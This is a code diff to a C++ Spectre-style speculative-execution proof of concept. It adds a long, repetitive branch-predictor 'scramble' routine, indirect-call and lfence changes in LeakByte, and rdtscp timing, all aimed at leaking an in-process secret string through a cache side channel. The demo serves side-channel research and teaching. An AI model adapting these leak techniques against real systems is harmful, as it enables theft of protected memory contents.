+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+    if (next() & 0x1) {
+      f(); f(); f(); f(); f();
+    }
+    if (gate) {
+      asm volatile(".rept 32 \n nopl   0x0(%eax) \n .endr");
+    }
+  }
+
+}
+
 // Objective: given some control over accesses to the *non-secret* string
 // "xxxxxxxxxxxxxx", construct a program that obtains "It's a s3kr3t!!!" without
 // ever accessing it in the C++ execution model, using speculative execution and
@@ -129,8 +1938,10 @@ static char LeakByte(size_t offset) {
       // Speculative fetch at the offset. Architecturally it fetches
       // always from the public_data, though speculatively it fetches the
       // private_data when i is at the local_pointer_index.
-      ForceRead(isolated_oracle.data() + static_cast<size_t>(
-          accessor->GetDataByte(offset, read_private_data)));
+      if (i == local_pointer_index) { scramble(); }
+      asm volatile("lfence");
+      auto fp = &DataAccessor::GetDataByte;
+      ForceRead(isolated_oracle.data() + static_cast<size_t>((accessor->*fp)(offset, read_private_data)));
     }
 
     std::pair<bool, char> result =
@@ -139,14 +1950,26 @@ static char LeakByte(size_t offset) {
       return result.second;
     }
 
-    if (run > 100000) {
+    if (run > 1000000) {
       std::cerr << "Does not converge " << result.second << std::endl;
       exit(EXIT_FAILURE);
     }
   }
 }
 
+static uint64_t now() {
+  uint32_t lh, hh;
+  asm volatile("lfence; rdtscp" : "=a"(lh), "=d"(hh) : : "%rcx");
+  return ((uint64_t) hh << 32) | lh;
+}
+
 int main() {
+  uint64_t b, a;
+  b = now();
+  scramble();
+  a = now();
+  printf("Scramble took %ld cycles\n", a-b);
+
   std::cout << "Leaking the string: ";
   std::cout.flush();
   for (size_t i = 0; i < strlen(public_data); ++i) {
